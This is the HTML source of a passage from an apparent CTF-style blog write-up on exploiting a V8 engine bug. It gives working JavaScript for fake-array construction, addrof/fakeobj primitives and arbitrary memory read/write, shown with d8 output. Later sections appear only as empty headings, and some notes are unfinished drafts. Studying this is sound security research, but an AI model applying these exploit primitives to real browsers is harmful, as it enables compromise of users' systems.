<span class="jsConKw">function</span> <span class="jsConIdx">hex64</span>(<span class="jsConIdx">i</span>) {
  <span class="jsConKw">return</span> <span class="jsConStr">"0x"</span> + <span class="jsConVar">i</span>.<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>).<span class="jsConFun">padStart</span>(<span class="jsConValIn">16</span>, <span class="jsConValIn">0</span>);
}
<!---->
<span class="jsConNull">// set up variables</span>
<span class="jsConKw">const</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>, <span class="jsConValIn">3.3</span>];
<span class="jsConKw">const</span> <span class="jsConIdx">tmpObj</span> = {<span class="jsConFun">a</span>: <span class="jsConValIn">1</span>};
<span class="jsConKw">const</span> <span class="jsConIdx">objArr</span> = [<span class="jsConVar">tmpObj</span>];
<!---->
<span class="jsConNull">// check the address of arr</span>
%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">arr</span>);
<!---->
<span class="jsConNull">// set up the fake array</span>
<span class="jsConKw">const</span> <span class="jsConIdx">arrAddr</span> = <span class="jsConValIn">0x12345678n</span>;
<span class="jsConKw">const</span> <span class="jsConIdx">arrElementsAddr</span> = <span class="jsConVar">arrAddr</span> - <span class="jsConValIn">0x20n</span>;
<span class="jsConKw">const</span> <span class="jsConIdx">fakeAddr</span> = <span class="jsConVar">arrElementsAddr</span> + <span class="jsConValIn">0x10n</span>;
<span class="jsConKw">const</span> <span class="jsConIdx">fakeElementsAddr</span> = <span class="jsConVar">arrElementsAddr</span> + <span class="jsConValIn">0x8n</span>;
<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000100000008a9n</span>);
<span class="jsConVar">arr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
<span class="jsConVar">arr</span>[<span class="jsConValIn">2</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000010000000000n</span> + <span class="jsConVar">fakeElementsAddr</span>);
<!---->
<span class="jsConNull">// do the exploit</span>
<span class="jsConKw">const</span> <span class="jsConIdx">tmp</span> = [<span class="jsConValIn">1.1</span>];
<span class="jsConKw">const</span> <span class="jsConIdx">evil</span> = {
  <span class="jsConFun">valueOf</span>: () =&gt; {
    <span class="jsConVar">tmp</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">arr</span>;
    <span class="jsConKw">return</span> <span class="jsConVar">Number</span>(<span class="jsConVar">arrAddr</span> ^ <span class="jsConVar">fakeAddr</span>);
  }
};
<span class="jsConVar">tmp</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">evil</span>);
<!---->
<span class="jsConNull">// this is the fake 128-element array</span>
<span class="jsConKw">const</span> <span class="jsConIdx">oob</span> = <span class="jsConVar">tmp</span>[<span class="jsConValIn">0</span>];
<!---->
<span class="jsConNull">// print out the data in the fake array</span>
<span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConVar">oob</span>.<span class="jsConFun">length</span>; <span class="jsConVar">i</span>++) {
  <span class="jsConKw">const</span> <span class="jsConIdx">addr</span> = <span class="jsConVar">hex32</span>(<span class="jsConVar">fakeElementsAddr</span> + <span class="jsConVar">BigInt</span>(<span class="jsConVar">i</span> + <span class="jsConValIn">1</span>)*<span class="jsConValIn">0x8n</span> - <span class="jsConValIn">1n</span>);
  <span class="jsConKw">const</span> <span class="jsConIdx">val</span> = <span class="jsConVar">hex64</span>(<span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConVar">i</span>]));
  <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">`</span>${<span class="jsConVar">addr</span>}<span class="jsConStr">: </span>${<span class="jsConVar">val</span>}<span class="jsConStr">`</span>);
}</div>
</div>

The beginning of the script sets up some helper functions. Then we create an array to store our fake array in as before, and also another array that has a random object in it.

To set up the fake array, we must know where our real array is at in memory. There are ways to accomplish this, but for now we'll just run %DebugPrint and use its output to change the **arrAddr** value in the code to what the memory address should be. This approach works fine in a controlled environment like ours, but breaks apart when attacking browsers in the real world. I'll share an approach without this shortcoming at the end of the post.

We can then guess how the rest of the memory lines up and use offsets to set a few other variables, such as the **fakeElementsAddr** which we add to the header of the fake array so that it points to where the fake array's elements are.

Once everything's set up we do the xor exploit thing and end up with the fake array in `tmp[0]`. We assign it to the `oob` variable for convenience and print its memory out in a format similar to the gdb output. Let's run it!

<div class="jsMem">
	<div class="jsMemTitle">VARS<div class="jsMemSep"></div></div>
	<div class="jsMemDbg"><span class="jsMemVar2">arr</span> = [5.43231e-312, <span class="jsMemVar0">3.88113e-311</span>, <span class="jsMemVar1">5.43231e-312</span>] // <span class="jsMemVar13">0x000432f9</span>
<span class="jsMemVar3">tmpObj</span> = {<span class="jsMemVar5">a</span>: <span class="jsMemVar4">1</span>} // <span class="jsMemVar11">0x00043309</span>
<span class="jsMemVar9">objArr</span> = <span class="jsMemVar10">[<span class="jsMemVar11">tmpObj</span>]</span> // <span class="jsMemVar14">0x00043341</span>
<span class="jsMemVar0">oob</span> = [...] // <span class="jsMemVar12">0x000432e9</span></div>
<div class="jsMemTitle">OUT<div class="jsMemSep"></div></div>
	<div class="jsMemHex">$ ./d8 --allow-natives-syntax exploit.js
<span class="jsMemVar12">0x000432e8</span>: 0x<span class="jsMemVar0">00000725001cb7c5</span>
0x000432f0: 0x<span class="jsMemVar1">00000100000432e1</span>
<span class="jsMemVar13">0x000432f8</span>: 0x<span class="jsMemVar2">00000725001cb7c5</span>
0x00043300: 0x<span class="jsMemVar2">00000006000432d9</span>
<span class="jsMemVar11">0x00043308</span>: 0x<span class="jsMemVar3">00000725001d3b05</span>
0x00043310: 0x<span class="jsMemVar4">00000002</span>00000725
0x00043318: 0x0001000100000685
0x00043320: 0x0000074d00000000
0x00043328: 0x00000084<span class="jsMemVar5">00002af1</span>
0x00043330: 0x<span class="jsMemVar10">0000056d</span>00000002
0x00043338: 0x<span class="jsMemVar11">00043309</span><span class="jsMemVar10">00000002</span>
<span class="jsMemVar14">0x00043340</span>: 0x<span class="jsMemVar9">00000725001cb845</span>
0x00043348: 0x<span class="jsMemVar9">0000000200043335</span>
...</div></div>

Neat! If we stare at the patterns in the memory we can make out the other arrays and stuff we initialized earlier. And if you think about it, we pretty much already have the **addrof** and **fakeobj** primitives here. We can get the address of the object in **objArr**, so if we put any object of our choice in that array we can see its address. And similarly, if we put an address to an object at that spot, we'll be able to access it through that array.

Let's write the primitives to get and set the upper 32 bits:

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConKw">function</span> <span class="jsConIdx">addrof</span>(<span class="jsConIdx">o</span>) {
  <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">o</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) >> <span class="jsConValIn">32n</span>;
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">fakeobj</span>(<span class="jsConIdx">a</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">temp</span> = <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) & <span class="jsConValIn">0xFFFFFFFFn</span>;
  <span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">temp</span> + (<span class="jsConVar">a</span> &lt;&lt; <span class="jsConValIn">32n</span>));
  <span class="jsConKw">return</span> <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>];
}</div>
</div>

If the address was at the lower bits, we'd need to modify the code a bit:

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConKw">function</span> <span class="jsConIdx">addrof</span>(<span class="jsConIdx">o</span>) {
  <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">o</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) & <span class="jsConValIn">0xFFFFFFFFn</span>;
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">fakeobj</span>(<span class="jsConIdx">a</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">temp</span> = <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) & <span class="jsConValIn">0xFFFFFFFF00000000n</span>;
  <span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">temp</span> + <span class="jsConVar">a</span>);
  <span class="jsConKw">return</span> <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>];
}</div>
</div>

Time to try them out! Let's do an experiment where we first try to get the address of our fake array, and then turn that address into a new pointer to that array.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">hex32</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">oob</span>))</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">0x000432e9</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">fakeArray</span> = <span class="jsConVar">fakeobj</span>(<span class="jsConValIn">0x000432e9n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">fakeArray</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(128) [<span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">5.432310575454e-312</span>, <span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">1.27321098e-313</span>, (124&nbsp;more)...]</i></summary>
<div style="padding-left: 24px">
<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x0000010000042bd1</span><br/>
<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
<span class="jsConIdx jsConB">3</span>: <span class="jsConValOut">0x0000000600042bc9</span><br/>
<span style="padding-left: 4px"><i>(124&nbsp;more)...</i><br/></span>
</div>
	</details></div>
</div>

Sweet! The pointer addresses here are tagged, so they're 1 bigger than the actual memory locations. We could make addrof and fakeobj subtract and add 1 to see and use the actual memory addresses, but it's a matter of taste.

Lastly we'll want to create primitives to arbitrarily **read** and **write** memory. To do that, we can create a new array, point it at any memory location we desire, and then read or write its first element. Although we did set the length of an array in two separate memory locations earlier, it turns out this isn't always required depending on what we want to do. If we just want to read or write a single double, we can just specify the desired address in the array header and it'll do the trick.

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConKw">function</span> <span class="jsConIdx">read</span>(<span class="jsConIdx">addr</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">readArr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>];
  <span class="jsConVar">readArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
  <span class="jsConVar">readArr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000000200000000n</span> + <span class="jsConVar">addr</span> - <span class="jsConValIn">0x8n</span>);
  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">fakeobj</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">readArr</span>) - <span class="jsConValIn">0x10n</span>)[<span class="jsConValIn">0</span>]);
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">write</span>(<span class="jsConIdx">addr</span>, <span class="jsConIdx">data</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">writeArr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>];
  <span class="jsConVar">writeArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
  <span class="jsConVar">writeArr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000000200000000n</span> + <span class="jsConVar">addr</span> - <span class="jsConValIn">0x8n</span>);
  <span class="jsConKw">const</span> <span class="jsConIdx">fakeArr</span> = <span class="jsConVar">fakeobj</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">writeArr</span>) - <span class="jsConValIn">0x10n</span>);
  <span class="jsConVar">fakeArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">data</span>);
}</div>
</div>

Did you know that strings in JavaScript are immutable! Anyways let's mutate them using the cool new functions we cooked up.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">text </span> = <span class="jsConStr">"ponypony"</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConStrOut">'ponypony'</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">textAddr</span> = <span class="jsConVar">addrof</span>(<span class="jsConVar">text</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">hex32</span>(<span class="jsConVar">textAddr</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">0x001d35fd</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">hex64</span>(<span class="jsConVar">read</span>(<span class="jsConVar">textAddr</span>))</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">0x430b3ed2000003dd</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">hex64</span>(<span class="jsConVar">read</span>(<span class="jsConVar">textAddr</span> + <span class="jsConValIn">0xcn</span>))</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">0x796e6f70796e6f70</span> <span class="jsConNull">// ynopynop</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">write</span>(<span class="jsConVar">textAddr</span> + <span class="jsConValIn">0xcn</span>, <span class="jsConValIn">0x6172796c6172796cn</span>) <span class="jsConNull">// arylaryl</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">text</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConStrOut">'lyralyra'</span></div>
</div>


We've done the impossible! Imagine how much we're gonna be able to speed up the performance of our webapps by running this exploit and making strings mutable.

## Part 4: Code execution
## Part 5: What could've been
## Part 6: The end

<style>
.jsMem {
	color: #DCDFE4;
	background: #282C34;
	border-radius: 4px;
	padding:8px;
	cursor: default;
}

.coarseText {
	display: none;
}
.fineText {
	display: inline;
}

/*
 *	Disable text selection on touchscreens because you can't
 *  hover over the interactive elements and tapping them will
 *  try to select the text if we don't disable selections.
 */
@media (pointer: coarse) {
	.jsMem {
		user-select: none;
	}
	.coarseText {
		display: inline;
	}
	.fineText {
		display: none;
	}
}

.jsMemTitle {
	pointer-events: none;
	user-select: none;
	color: var(--lyreGold);
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
	font-size: 14px;
	display: flex;
	margin: 4px 4px 4px;
}
.jsMemSep {
	margin-left: 5px;
	margin-top: 1px;
	flex-grow: 1;
	align-self: center;
	display: inline-block;
	height: 2px;
	background: var(--lyreGold);
}

.jsMem *::selection {
	background: #00F;
	color: #FFF;
}

.jsMemDbg {
	font-size: 12px;
	white-space: pre-wrap;
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
}

.jsMemHex {
	font-size: 12px;
	white-space: pre-wrap;
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
}

.jsMemLegend span {
	/* text-decoration: underline wavy; */
}

:root {
	--lyreGold: #FAD542;
	--jsMemVarB0:  #0000;
	--jsMemVarB1:  #0000;
	--jsMemVarB2:  #0000;
	--jsMemVarB3:  #0000;
	--jsMemVarB4:  #0000;
	--jsMemVarB5:  #0000;
	--jsMemVarB6:  #0000;
	--jsMemVarB7:  #0000;
	--jsMemVarB8:  #0000;
	--jsMemVarB9:  #0000;
	--jsMemVarB10:  #0000;
	--jsMemVarB11:  #0000;
	--jsMemVarB12:  #0000;
	--jsMemVarB13:  #0000;
	--jsMemVarB14:  #0000;
	--jsMemVarB15:  #0000;
	--jsMemVarB16:  #0000;
	--jsMemVarB17:  #0000;
	--jsMemVarB18:  #0000;
	--jsMemVarB19:  #0000;
	--jsMemVarB20:  #0000;
	--jsMemVarB21:  #0000;
	--jsMemVarF0:  #ff9999;
	--jsMemVarF1:  #ffc199;
	--jsMemVarF2:  #ffea99;
	--jsMemVarF3:  #eaff99;
	--jsMemVarF4:  #c1ff99;
	--jsMemVarF5:  #99ff99;
	--jsMemVarF6:  #99ffc1;
	--jsMemVarF7:  #99ffea;
	--jsMemVarF8:  #99eaff;
	--jsMemVarF9:  #99c1ff;
	--jsMemVarF10:  #9999ff;
	--jsMemVarF11:  #c199ff;
	--jsMemVarF12:  #ea99ff;
	--jsMemVarF13:  #ff99ea;
	--jsMemVarF14:  #ff99c1;
	--jsMemVarF15:  #ff9999;
	--jsMemVarF16:  #ffc199;
	--jsMemVarF17:  #ffea99;
	--jsMemVarF18:  #eaff99;
	--jsMemVarF19:  #c1ff99;
	--jsMemVarF20:  #99ff99;
	--jsMemVarF21:  #99ffc1;
	--jsMemVarB: var(--lyreGold);
	--jsMemVarF: #000;
}

.jsMemVar0 { color: var(--jsMemVarF0); background: var(--jsMemVarB0) }
.jsMemVar1 { color: var(--jsMemVarF1); background: var(--jsMemVarB1) }
.jsMemVar2 { color: var(--jsMemVarF2); background: var(--jsMemVarB2) }
.jsMemVar3 { color: var(--jsMemVarF3); background: var(--jsMemVarB3) }
.jsMemVar4 { color: var(--jsMemVarF4); background: var(--jsMemVarB4) }
.jsMemVar5 { color: var(--jsMemVarF5); background: var(--jsMemVarB5) }
.jsMemVar6 { color: var(--jsMemVarF6); background: var(--jsMemVarB6) }
.jsMemVar7 { color: var(--jsMemVarF7); background: var(--jsMemVarB7) }
.jsMemVar8 { color: var(--jsMemVarF8); background: var(--jsMemVarB8) }
.jsMemVar9 { color: var(--jsMemVarF9); background: var(--jsMemVarB9) }
.jsMemVar10 { color: var(--jsMemVarF10); background: var(--jsMemVarB10) }
.jsMemVar11 { color: var(--jsMemVarF11); background: var(--jsMemVarB11) }
.jsMemVar12 { color: var(--jsMemVarF12); background: var(--jsMemVarB12) }
.jsMemVar13 { color: var(--jsMemVarF13); background: var(--jsMemVarB13) }
.jsMemVar14 { color: var(--jsMemVarF14); background: var(--jsMemVarB14) }
.jsMemVar15 { color: var(--jsMemVarF15); background: var(--jsMemVarB15) }
.jsMemVar16 { color: var(--jsMemVarF16); background: var(--jsMemVarB16) }
.jsMemVar17 { color: var(--jsMemVarF17); background: var(--jsMemVarB17) }
.jsMemVar18 { color: var(--jsMemVarF18); background: var(--jsMemVarB18) }
.jsMemVar19 { color: var(--jsMemVarF19); background: var(--jsMemVarB19) }
.jsMemVar20 { color: var(--jsMemVarF20); background: var(--jsMemVarB20) }
.jsMemVar21 { color: var(--jsMemVarF21); background: var(--jsMemVarB21) }
.jsMem:has(.jsMemVar0:hover) { --jsMemVarB0: var(--jsMemVarB); --jsMemVarF0: var(--jsMemVarF) }
.jsMem:has(.jsMemVar1:hover) { --jsMemVarB1: var(--jsMemVarB); --jsMemVarF1: var(--jsMemVarF) }
.jsMem:has(.jsMemVar2:hover) { --jsMemVarB2: var(--jsMemVarB); --jsMemVarF2: var(--jsMemVarF) }
.jsMem:has(.jsMemVar3:hover) { --jsMemVarB3: var(--jsMemVarB); --jsMemVarF3: var(--jsMemVarF) }
.jsMem:has(.jsMemVar4:hover) { --jsMemVarB4: var(--jsMemVarB); --jsMemVarF4: var(--jsMemVarF) }
.jsMem:has(.jsMemVar5:hover) { --jsMemVarB5: var(--jsMemVarB); --jsMemVarF5: var(--jsMemVarF) }
.jsMem:has(.jsMemVar6:hover) { --jsMemVarB6: var(--jsMemVarB); --jsMemVarF6: var(--jsMemVarF) }
.jsMem:has(.jsMemVar7:hover) { --jsMemVarB7: var(--jsMemVarB); --jsMemVarF7: var(--jsMemVarF) }
.jsMem:has(.jsMemVar8:hover) { --jsMemVarB8: var(--jsMemVarB); --jsMemVarF8: var(--jsMemVarF) }
.jsMem:has(.jsMemVar9:hover) { --jsMemVarB9: var(--jsMemVarB); --jsMemVarF9: var(--jsMemVarF) }
.jsMem:has(.jsMemVar10:hover) { --jsMemVarB10: var(--jsMemVarB); --jsMemVarF10: var(--jsMemVarF) }
.jsMem:has(.jsMemVar11:hover) { --jsMemVarB11: var(--jsMemVarB); --jsMemVarF11: var(--jsMemVarF) }
.jsMem:has(.jsMemVar12:hover) { --jsMemVarB12: var(--jsMemVarB); --jsMemVarF12: var(--jsMemVarF) }
.jsMem:has(.jsMemVar13:hover) { --jsMemVarB13: var(--jsMemVarB); --jsMemVarF13: var(--jsMemVarF) }
.jsMem:has(.jsMemVar14:hover) { --jsMemVarB14: var(--jsMemVarB); --jsMemVarF14: var(--jsMemVarF) }
.jsMem:has(.jsMemVar15:hover) { --jsMemVarB15: var(--jsMemVarB); --jsMemVarF15: var(--jsMemVarF) }
.jsMem:has(.jsMemVar16:hover) { --jsMemVarB16: var(--jsMemVarB); --jsMemVarF16: var(--jsMemVarF) }
.jsMem:has(.jsMemVar17:hover) { --jsMemVarB17: var(--jsMemVarB); --jsMemVarF17: var(--jsMemVarF) }
.jsMem:has(.jsMemVar18:hover) { --jsMemVarB18: var(--jsMemVarB); --jsMemVarF18: var(--jsMemVarF) }
.jsMem:has(.jsMemVar19:hover) { --jsMemVarB19: var(--jsMemVarB); --jsMemVarF19: var(--jsMemVarF) }
.jsMem:has(.jsMemVar20:hover) { --jsMemVarB20: var(--jsMemVarB); --jsMemVarF20: var(--jsMemVarF) }
.jsMem:has(.jsMemVar21:hover) { --jsMemVarB21: var(--jsMemVarB); --jsMemVarF21: var(--jsMemVarF) }
</style>

<!--

## Part x: There's better ways

args.gn has v8_enable_sandbox = false

other solutions:
 - rdjgr: change length
 - popax21: flip obj/ptr bit

--allow-natives-syntax

todo:
32bit pointer/memory compression
make sure we're in 0xa38 address space
make sure we have mobile addresses available

note: the v8/gdb highlighting thing doesn't work in the current version of ladybird because it doesn't support the :has() selector, and the little endian widget won't work due to no resizable handles

-->

[^1]: `PACKED_DOUBLE_ELEMENTS` means that the array consists of doubles only, and it also doesn't have any empty "holes". A double array with holes would be `HOLEY_DOUBLE_ELEMENTS` instead.

[^2]: [HasOnlySimpleReceiverElements](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-array.cc;l=42;drc=fe67713b2ff62f8ba290607bf7482a8efd0ca6cc) makes sure that there are no accessors on any of the elements, and that the array's prototype hasn't been modified.

[^3]: `x/8xg` stands for: e(**x**)amine (**8**) he(**x**)adecimal (**g**)iant words (64-bit values). I recommend checking out [a reference](https://visualgdb.com/gdbreference/commands/x) to see other ways this command can be used.

[^4]: In memory the length of the array is doubled (6 instead of 3) because each double value takes up two 32-bit "slots". TODO: factcheck this

[^5]: JavaScript floating-point numbers can only accurately represent integers up to 2<sup>53</sup>–1. You *can* have larger numbers, but they won't be accurate. [BigInts](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt) are a separate data type that doesn't have this issue - they can be infinitely big while still being accurate! Well, perhaps not infinitely big, but [in V8](https://v8.dev/features/bigint) their size can be [over a billion bits](https://stackoverflow.com/a/70537884/2251833), which would be about 128MiB of just a single number.

<style>
	.challDetails {
		line-height: 12px;
		font-size: 16px;
		background: #212529;
		border: 1px solid rgba(255, 255, 255, 0.15);
		color: #dee2e6;
		font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
		border-radius: 8px;
		max-width: 500px;
		margin: 16px auto;
	}
	.challDetails *::selection {
		background: #073BA6;
	}
	.challFiles *::selection {
		background: #0F0;
		color: #000;
	}
	.challTitle {
		font-size: 24px;
		font-weight: 500;
		padding: 16px;
	}
	.challSubtitle {
		font-size: 20px;
		font-weight: 500;
		text-align: center;
		padding: 12px 0;
	}
	.challHr {
		border-bottom: 1px solid #495057;
	}
	.challTags {
		text-align: center;
		padding: 16px 16px 0 16px;
		user-select: none;
	}
	.challSection {
		padding: 0 16px 16px 16px;
	}
	.challSection code {
		overflow-wrap: break-word;
	}
	.challTag {
		border-radius: 6px;
		font-weight: bold;
		height: 32px;
		padding: 2px 6px;
		font-size: 13px;
	}
	.challFiles > ul {
		border-radius: 6px;
		background: #111;
		border: 1px solid #fff;
		line-height: 20px;
		padding: 14px;
		margin-bottom: 0;
		list-style-type: none;
		font-size: 12px;
		font-family: 'Nimbus Mono PS', 'Courier New', monospace;
	}
	.challFiles a {
		color: #0F0;
	}
	.challFiles a:hover {
		text-decoration: underline;
	}
	.challFiles > summary {
		color: #fff;
		background: #007bff;
		width: fit-content;
		padding: 12px;
		border-radius: 6px;
		user-select: none;
		cursor: pointer;
	}
	.challScores {
		width: 100%;
		border-collapse: collapse;
		background: #1c232b;
	}
	.challScores tr > * {
		border: solid 1px rgb(73, 80, 87);
		padding: 4px 8px;
		line-height: 20px;
		text-align: left;
	}
	.challScores tr > :first-child {
  		text-align:center;
  		width: 0;
	}
	.challScores tbody tr:nth-of-type(odd) {
  		background: #29313b;
	}
	.challScores tbody tr:hover {
  		background: #2b3a4d;
	}
</style>
<style>
	/* temporary */
	.highlight > pre {
		white-space: pre-wrap;
		overflow-wrap: anywhere;
	}
</style>